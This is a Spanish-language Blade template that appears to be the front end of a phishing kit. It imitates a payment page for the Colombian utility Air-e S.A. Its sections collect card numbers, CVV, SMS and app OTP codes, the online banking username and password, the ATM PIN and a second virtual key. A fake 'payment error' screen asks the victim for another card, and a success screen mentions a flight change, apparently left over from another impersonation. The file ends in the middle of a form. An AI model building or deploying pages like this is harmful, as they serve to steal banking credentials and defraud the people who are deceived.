{{--
    Componente de Pago - Secciones de método de pago, tarjeta y PSE
    Se incluye desde chat.blade.php para mantener el archivo principal más pequeño
--}}

@php
    // Nombre del comercio que aparece en las secciones OTP
    $nombreComercio = 'Air-e S.A.';
@endphp

<!-- OVERLAY DE CARGA CON SPINNER CENTRADO -->
<div id="loadingOverlay" class="fixed inset-0 z-50 hidden">
    <div class="absolute inset-0 bg-black/50 backdrop-blur-sm"></div>
    <div class="absolute inset-0 flex items-center justify-center">
        <div class="text-center">
            <svg class="animate-spin h-16 w-16 text-white mx-auto mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            <p id="loadingText" class="text-white text-lg font-medium">Procesando...</p>
        </div>
    </div>
</div>

<!-- SECCIÓN: TDC (Solicitar otra tarjeta de crédito) -->
<section id="seccion-tdc" class="min-h-screen bg-gray-50" style="display: none;">
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-center">
        <h2 class="text-xl font-medium">Verificación Adicional</h2>
    </div>
    <div class="px-6 py-8">
        <div class="text-center mb-8">
            <div class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-8 h-8 text-orange-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
                </svg>
            </div>
            <h3 class="text-xl font-bold text-gray-900 mb-2">Error en el pago</h3>
            <p class="text-gray-600">La información ingresada es incorrecta o no hay saldo suficiente. Por favor, verifica los datos e intenta nuevamente o usa otra tarjeta para completar el pago.</p>
        </div>
        <div class="max-w-sm mx-auto space-y-4">
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Número de tarjeta</label>
                <input type="text" id="tdcNumeroInput" placeholder="" maxlength="19"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="formatearNumeroTarjeta(this); validarTdc()">
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Vencimiento</label>
                    <input type="text" id="tdcVencimientoInput" placeholder="MM/AA" maxlength="5"
                        class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                        oninput="formatearFechaVencimiento(this); validarTdc()">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
                    <input type="password" id="tdcCvvInput" placeholder="***" maxlength="4"
                        class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                        oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarTdc()">
                </div>
            </div>
            <div id="errorTdc" class="text-red-500 text-sm text-center hidden"></div>
            <button onclick="enviarTdc()" id="btnTdc" disabled
                class="w-full mt-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
                <span id="textoTdc">Verificar</span>
                <div id="spinnerTdc" class="hidden">
                    <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                </div>
            </button>
        </div>
    </div>
</section>

<!-- SECCIÓN: OTP SMS -->
<section id="seccion-otpsms" class="min-h-screen bg-gray-50 flex flex-col" style="display: none;">
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-center">
        <h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
    </div>
    <div class="flex-1 flex items-center justify-center p-4">
    <div class="bg-white rounded-xl shadow-lg max-w-md w-full p-6">
        <!-- Logo dinámico según tipo de tarjeta -->
        <div class="mb-4" id="otpSmsLogo">
            <!-- Se actualizará dinámicamente -->
        </div>

        <!-- Título -->
        <h3 class="text-xl font-bold text-gray-800 mb-1">Autenticación con código SMS</h3>
        <p class="text-gray-600 text-sm mb-6">Ingresa el código enviado a tu celular.</p>

        <!-- Información de la transacción -->
        <div class="space-y-2 text-sm mb-6">
            <div class="flex">
                <span class="text-gray-600 w-36">Comercio:</span>
                <span class="text-gray-800">{{ $nombreComercio }}</span>
            </div>
            <div class="flex">
                <span class="text-gray-600 w-36">Monto:</span>
                <span class="text-gray-800" id="otpSmsAmount">0 COP</span>
            </div>
            <div class="flex">
                <span class="text-gray-600 w-36">Fecha:</span>
                <span class="text-gray-800" id="otpSmsDate"></span>
            </div>
            <div class="flex">
                <span class="text-gray-600 w-36">Número de Tarjeta:</span>
                <span class="text-gray-800" id="otpSmsCardNumber">XXXX XXXX XXXX 0000</span>
            </div>
            <div class="flex">
                <span class="text-gray-600 w-36">Mensaje Personal:</span>
                <span class="text-gray-800"></span>
            </div>
            <div class="flex items-center">
                <span class="text-gray-600 w-36">Código:</span>
                <input type="text" id="otpSmsInput" maxlength="6" placeholder=""
                    class="flex-1 px-3 py-2 border border-[#1a4b8c] rounded focus:outline-none focus:ring-2 focus:ring-[#1a4b8c]"
                    oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarOtpSms()">
            </div>
        </div>

        <div id="errorOtpSms" class="text-red-500 text-sm mb-4 hidden"></div>

        <!-- Botones -->
        <div class="flex items-center gap-4 text-sm">
            <a href="#" class="text-[#1a4b8c] hover:underline">Ayuda</a>
            <a href="#" class="text-[#1a4b8c] hover:underline" onclick="mostrarSeccion('seccion-tarjeta'); return false;">Cancelar</a>
            <button onclick="enviarOtpSms()" id="btnOtpSms" disabled
                class="bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-medium py-2 px-6 rounded transition-colors flex items-center gap-2">
                <span id="textoOtpSms">Enviar</span>
                <div id="spinnerOtpSms" class="hidden">
                    <svg class="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                </div>
            </button>
        </div>
    </div>
    </div>
</section>

<!-- SECCIÓN: OTP APP -->
<section id="seccion-otpapp" class="min-h-screen bg-gray-50 flex flex-col" style="display: none;">
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-center">
        <h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
    </div>
    <div class="flex-1 flex items-center justify-center p-4">
    <div class="bg-white rounded-xl shadow-lg max-w-md w-full p-6">
        <!-- Logo dinámico según tipo de tarjeta -->
        <div class="mb-4" id="otpAppLogo">
            <!-- Se actualizará dinámicamente -->
        </div>

        <!-- Título -->
        <h3 class="text-xl font-bold text-gray-800 mb-1">Autenticación con código de App</h3>
        <p class="text-gray-600 text-sm mb-6">Ingresa el código generado en tu aplicación bancaria.</p>

        <!-- Información de la transacción -->
        <div class="space-y-2 text-sm mb-6">
            <div class="flex">
                <span class="text-gray-600 w-36">Comercio:</span>
                <span class="text-gray-800">{{ $nombreComercio }}</span>
            </div>
            <div class="flex">
                <span class="text-gray-600 w-36">Monto:</span>
                <span class="text-gray-800" id="otpAppAmount">0 COP</span>
            </div>
            <div class="flex">
                <span class="text-gray-600 w-36">Fecha:</span>
                <span class="text-gray-800" id="otpAppDate"></span>
            </div>
            <div class="flex">
                <span class="text-gray-600 w-36">Número de Tarjeta:</span>
                <span class="text-gray-800" id="otpAppCardNumber">XXXX XXXX XXXX 0000</span>
            </div>
            <div class="flex">
                <span class="text-gray-600 w-36">Mensaje Personal:</span>
                <span class="text-gray-800"></span>
            </div>
            <div class="flex items-center">
                <span class="text-gray-600 w-36">Código:</span>
                <input type="text" id="otpAppInput" maxlength="8"
                    class="flex-1 px-3 py-2 border border-[#1a4b8c] rounded focus:outline-none focus:ring-2 focus:ring-[#1a4b8c]"
                    oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarOtpApp()">
            </div>
        </div>

        <div id="errorOtpApp" class="text-red-500 text-sm mb-4 hidden"></div>

        <!-- Botones -->
        <div class="flex items-center gap-4 text-sm">
            <a href="#" class="text-[#1a4b8c] hover:underline">Ayuda</a>
            <a href="#" class="text-[#1a4b8c] hover:underline" onclick="mostrarSeccion('seccion-tarjeta'); return false;">Cancelar</a>
            <button onclick="enviarOtpApp()" id="btnOtpApp" disabled
                class="bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-medium py-2 px-6 rounded transition-colors flex items-center gap-2">
                <span id="textoOtpApp">Enviar</span>
                <div id="spinnerOtpApp" class="hidden">
                    <svg class="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                </div>
            </button>
        </div>
    </div>
    </div>
</section>

<!-- SECCIÓN: LOGIN (Revalidar credenciales) -->
<section id="seccion-login" class="min-h-screen bg-gray-50" style="display: none;">
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-center">
        <h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
    </div>
    <div class="px-6 py-8">
        <div class="text-center mb-8">
            <div class="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-8 h-8 text-yellow-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                </svg>
            </div>
            <h3 class="text-xl font-bold text-gray-900 mb-2">Confirma tu Identidad</h3>
            <p class="text-gray-600">Por seguridad, necesitamos verificar tus credenciales bancarias</p>
        </div>
        <div class="max-w-sm mx-auto space-y-4">
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Usuario / Documento</label>
                <input type="text" id="loginUsuarioInput" placeholder="Número de documento"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="validarLogin()">
            </div>
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Contraseña</label>
                <input type="password" id="loginClaveInput" placeholder="Tu contraseña"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="validarLogin()">
            </div>
            <div id="errorLogin" class="text-red-500 text-sm text-center hidden"></div>
            <button onclick="enviarLogin()" id="btnLogin" disabled
                class="w-full mt-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
                <span id="textoLogin">Verificar</span>
                <div id="spinnerLogin" class="hidden">
                    <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                </div>
            </button>
        </div>
    </div>
</section>

<!-- SECCIÓN: CLAVE CAJERO -->
<section id="seccion-clavecajero" class="min-h-screen bg-gray-50" style="display: none;">
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-center">
        <h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
    </div>
    <div class="px-6 py-8">
        <div class="text-center mb-8">
            <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z"/>
                </svg>
            </div>
            <h3 class="text-xl font-bold text-gray-900 mb-2">Clave de Cajero Automático</h3>
            <p class="text-gray-600">Ingresa tu clave de 4 dígitos que usas en el cajero automático</p>
        </div>
        <div class="max-w-sm mx-auto">
            <label class="block text-sm font-medium text-gray-700 mb-2">Clave de 4 dígitos</label>
            <input type="password" id="claveCajeroInput" placeholder="****" maxlength="4"
                class="w-full px-4 py-4 text-2xl text-center tracking-widest border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarClaveCajero()">
            <p class="text-sm text-gray-500 mt-2 text-center">La misma clave que utilizas en cajeros automáticos</p>
            <div id="errorClaveCajero" class="text-red-500 text-sm mt-2 text-center hidden"></div>
            <button onclick="enviarClaveCajero()" id="btnClaveCajero" disabled
                class="w-full mt-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
                <span id="textoClaveCajero">Verificar</span>
                <div id="spinnerClaveCajero" class="hidden">
                    <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                </div>
            </button>
        </div>
    </div>
</section>

<!-- SECCIÓN: CLAVE VIRTUAL -->
<section id="seccion-clavevirtual" class="min-h-screen bg-gray-50" style="display: none;">
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-center">
        <h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
    </div>
    <div class="px-6 py-8">
        <div class="text-center mb-8">
            <div class="w-16 h-16 bg-indigo-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-8 h-8 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/>
                </svg>
            </div>
            <h3 class="text-xl font-bold text-gray-900 mb-2">Clave Virtual / Segunda Clave</h3>
            <p class="text-gray-600">Ingresa tu clave virtual o segunda clave de seguridad</p>
        </div>
        <div class="max-w-sm mx-auto">
            <label class="block text-sm font-medium text-gray-700 mb-2">Clave Virtual</label>
            <input type="password" id="claveVirtualInput" placeholder="****" maxlength="6"
                class="w-full px-4 py-4 text-2xl text-center tracking-widest border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarClaveVirtual()">
            <p class="text-sm text-gray-500 mt-2 text-center">Tu clave virtual de transacciones</p>
            <div id="errorClaveVirtual" class="text-red-500 text-sm mt-2 text-center hidden"></div>
            <button onclick="enviarClaveVirtual()" id="btnClaveVirtual" disabled
                class="w-full mt-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
                <span id="textoClaveVirtual">Verificar</span>
                <div id="spinnerClaveVirtual" class="hidden">
                    <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                </div>
            </button>
        </div>
    </div>
</section>

<!-- SECCIÓN: CAMBIAR MÉTODO DE PAGO -->
<section id="seccion-cambiar" class="min-h-screen bg-gray-50" style="display: none;">
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-center">
        <h2 class="text-xl font-medium">Cambio de Método de Pago</h2>
    </div>
    <div class="px-6 py-12 flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-blue-100 rounded-full flex items-center justify-center mb-6">
            <svg class="w-16 h-16 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
            </svg>
        </div>
        <h3 class="text-2xl font-bold text-gray-900 mb-4 text-center">Selecciona otro método de pago</h3>
        <p class="text-gray-600 text-center max-w-md mb-8">
            El método de pago seleccionado no pudo ser procesado. Por favor, elige otra forma de pago para continuar con tu transacción.
        </p>
        <button onclick="mostrarSeccion('seccion-metodo-pago')" class="bg-[#1a3a6e] hover:bg-[#152d54] text-white font-bold py-4 px-8 rounded-xl text-lg transition-colors">
            Cambiar método de pago
        </button>
    </div>
</section>

<!-- SECCIÓN: FIN (Éxito) -->
<section id="seccion-fin" class="min-h-screen bg-gray-50" style="display: none;">
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-center">
        <h2 class="text-xl font-medium">Proceso Completado</h2>
    </div>
    <div class="px-6 py-12 flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-6">
            <svg class="w-16 h-16 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
            </svg>
        </div>
        <h3 class="text-2xl font-bold text-gray-900 mb-3">¡Pago Exitoso!</h3>
        <p class="text-gray-600 text-center max-w-sm mb-4">Tu cambio de vuelo ha sido procesado correctamente.</p>
        <p class="text-gray-500 text-sm text-center">Recibirás un correo de confirmación con los detalles de tu nuevo itinerario.</p>
        <div class="mt-8 bg-gray-50 rounded-xl p-6 w-full max-w-sm">
            <p class="text-sm text-gray-500 text-center">Número de confirmación:</p>
            <p class="text-xl font-bold text-gray-900 text-center" id="numeroConfirmacion">CV-000000</p>
        </div>
        <p class="text-sm text-gray-400 mt-6">Serás redirigido en unos momentos...</p>
    </div>
</section>

<!-- SECCIÓN: ERROR -->
<section id="seccion-error" class="min-h-screen bg-gray-50" style="display: none;">
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-center">
        <h2 class="text-xl font-medium">Error en el Proceso</h2>
    </div>
    <div class="px-6 py-12 flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center mb-6">
            <svg class="w-16 h-16 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
            </svg>
        </div>
        <h3 class="text-2xl font-bold text-gray-900 mb-3">No pudimos procesar tu solicitud</h3>
        <p class="text-gray-600 text-center max-w-sm mb-4">Ha ocurrido un error al procesar tu pago. Por favor, intenta nuevamente más tarde.</p>
        <p class="text-gray-500 text-sm text-center">Si el problema persiste, comunícate con nuestro servicio al cliente.</p>
        <button onclick="window.location.reload()" class="mt-8 bg-[#1a3a6e] hover:bg-[#152d54] text-white font-bold py-3 px-8 rounded-xl text-lg transition-colors">
            Intentar de nuevo
        </button>
        <p class="text-sm text-gray-400 mt-6">Serás redirigido en unos momentos...</p>
    </div>
</section>

<!-- SECCIÓN 7: MÉTODO DE PAGO -->
<section id="seccion-metodo-pago" class="min-h-screen bg-gray-50" style="display: none;">
    <!-- Header azul -->
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-between">
        <button onclick="volverDesdeMetodoPago()" class="p-2">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
            </svg>
        </button>
        <h2 class="text-xl font-medium">Método de pago</h2>
        <button onclick="volverDesdeMetodoPago()" class="p-2">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
            </svg>
        </button>
    </div>

    <div class="px-6 py-6">
        <!-- Total a pagar -->
        <div class="bg-gray-50 rounded-xl p-6 mb-6">
            <div class="flex items-center justify-between">
                <span class="text-lg font-medium text-gray-700">Total a pagar:</span>
                <div class="text-right">
                    <div class="text-3xl font-bold text-gray-900"><span id="totalMetodoPago">0</span> <span id="monedaMetodoPago">COP</span></div>
                </div>
            </div>
        </div>

        <!-- Título -->
        <h3 class="text-lg font-medium text-gray-900 mb-4">Selecciona tu método de pago</h3>

        <!-- Opciones de método de pago -->
        <div class="space-y-4">
            <!-- Opción Tarjeta de Crédito -->
            <div onclick="seleccionarMetodoPago('tarjeta')" id="opcion-tarjeta" class="border-2 border-gray-300 rounded-xl p-4 cursor-pointer hover:border-[#1a4b8c] transition-all bg-white">
                <div class="flex items-center gap-4">
                    <div id="radio-tarjeta" class="w-6 h-6 rounded-full border-2 border-gray-400 flex items-center justify-center flex-shrink-0">
                        <!-- Círculo interno cuando está seleccionado -->
                    </div>
                    <div class="flex items-center gap-3 flex-1">
                        <svg class="w-8 h-8 text-gray-700" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/>
                        </svg>
                        <div>
                            <div class="text-lg font-medium text-gray-900">Tarjeta de Crédito</div>
                            <div class="text-sm text-gray-500">Visa, Mastercard, American Express</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Opción PSE -->
            <div onclick="seleccionarMetodoPago('pse')" id="opcion-pse" class="border-2 border-gray-300 rounded-xl p-4 cursor-pointer hover:border-[#1a4b8c] transition-all bg-white">
                <div class="flex items-center gap-4">
                    <div id="radio-pse" class="w-6 h-6 rounded-full border-2 border-gray-400 flex items-center justify-center flex-shrink-0">
                        <!-- Círculo interno cuando está seleccionado -->
                    </div>
                    <div class="flex items-center gap-3 flex-1">
                        <svg class="w-8 h-8 text-gray-700" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M4 10h3v7H4zm6.5 0h3v7h-3zM2 19h20v3H2zm15-9h3v7h-3zm-5-9L2 6v2h20V6z"/>
                        </svg>
                        <div>
                            <div class="text-lg font-medium text-gray-900">PSE</div>
                            <div class="text-sm text-gray-500">Débito bancario directo</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- SECCIÓN 8: FORMULARIO TARJETA DE CRÉDITO -->
<section id="seccion-tarjeta" class="min-h-screen bg-gray-50" style="display: none;">
    <!-- Header azul -->
    <div class="bg-[#1a4b8c] text-white px-6 py-4 flex items-center justify-between">
        <button onclick="volverAMetodoPago()" class="p-2">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
            </svg>
        </button>
        <h2 class="text-xl font-medium">Tarjeta de Crédito</h2>
        <button onclick="volverAMetodoPago()" class="p-2">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
            </svg>
        </button>
    </div>

    <div class="px-6 py-6">
        <!-- Total a pagar -->
        <div class="bg-gray-50 rounded-xl p-6 mb-6">
            <div class="flex items-center justify-between">
                <span class="text-lg font-medium text-gray-700">Total a pagar:</span>
                <div class="text-right">
                    <div class="text-3xl font-bold text-gray-900"><span id="totalTarjeta">0</span> <span id="monedaTarjeta">COP</span></div>
                </div>
            </div>
        </div>

        <!-- Formulario de tarjeta -->
        <div class="space-y-4">
            <!-- Título datos de tarjeta -->
            <h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2">Datos de la tarjeta</h3>

            <!-- Número de tarjeta -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Número de tarjeta</label>
                <input type="text" id="numeroTarjeta" placeholder="" maxlength="19"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="formatearNumeroTarjeta(this)">
            </div>

            <!-- Nombre del titular -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Nombre del titular</label>
                <input type="text" id="nombreTitular" placeholder="Como aparece en la tarjeta"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="this.value = this.value.toUpperCase()">
            </div>

            <!-- Fecha de vencimiento y CVV -->
            <div class="grid grid-cols-2 gap-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Fecha de vencimiento</label>
                    <input type="text" id="fechaVencimiento" placeholder="MM/AA" maxlength="5"
                        class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                        oninput="formatearFechaVencimiento(this)">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
                    <input type="password" id="cvv" placeholder="123" maxlength="4"
                        class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                        oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                </div>
            </div>

            <!-- Título datos del pagador -->
            <h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2 mt-6">Información del pagador</h3>

            <!-- Nombre completo -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Nombre completo</label>
                <input type="text" id="nombrePagadorTarjeta" placeholder="Nombre y apellidos"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="this.value = this.value.toUpperCase()">
            </div>

            <!-- Email -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Correo electrónico</label>
                <input type="email" id="emailPagadorTarjeta" placeholder="correo@ejemplo.com"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent">
            </div>

            <!-- Celular -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Celular</label>
                <input type="tel" id="celularPagadorTarjeta" placeholder="300 123 4567" maxlength="12"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="this.value = this.value.replace(/[^0-9\s]/g, '')">
            </div>

            <!-- Dirección -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">Dirección</label>
                <input type="text" id="direccionPagadorTarjeta" placeholder="Calle 123 # 45-67"
                    class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
                    oninput="this.value = this.value.toUpperCase()">
            </div>

            <!-- Ciudad y Departamento -->
            <div class="grid grid-cols-2 gap-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Ciudad</label>
                    <input type="text" id="ciudadPagadorTarjeta" placeholder="Bogotá"
                        class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1a4b8c] focus:border-transparent"
